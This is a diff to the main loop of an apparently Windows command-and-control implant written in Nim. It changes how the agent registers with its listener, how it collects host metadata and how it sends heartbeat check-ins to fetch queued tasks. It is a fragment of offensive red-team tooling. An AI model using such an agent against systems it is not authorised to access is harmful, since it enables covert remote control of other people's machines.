@@ -1,10 +1,9 @@
 import strformat, os, times, random
 import winim
-import sugar
 
-import ./agentTypes
-import core/[task, packer, http, metadata]
+import core/[task, taskresult, heartbeat, http, metadata]
 import ../../common/[types, utils]
+import sugar
 
 const ListenerUuid {.strdefine.}: string = ""
 const Octet1 {.intdefine.}: int = 0
@@ -45,7 +44,7 @@ proc main() =
     )
 
     # Create registration payload
-    let registrationData: AgentRegistrationData = config.getRegistrationData()
+    let registrationData: AgentRegistrationData = config.collectAgentMetadata()
     let registrationBytes = serializeRegistrationData(registrationData)
 
     config.register(registrationBytes)
@@ -67,8 +66,12 @@ proc main() =
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
         echo fmt"[{date}] Checking in."
 
-        # Retrieve task queue for the current agent
-        let packet: string = config.getTasks()
+        # Retrieve task queue for the current agent by sending a check-in/heartbeat request
+        # The check-in request contains the agentId, listenerId, so the server knows which tasks to return
+        let             
+            heartbeat: Heartbeat = config.createHeartbeat()
+            heartbeatData: seq[byte] = serializeHeartbeat(heartbeat)
+            packet: string = config.getTasks(heartbeatData)
 
         if packet.len <= 0: 
             echo "No tasks to execute."
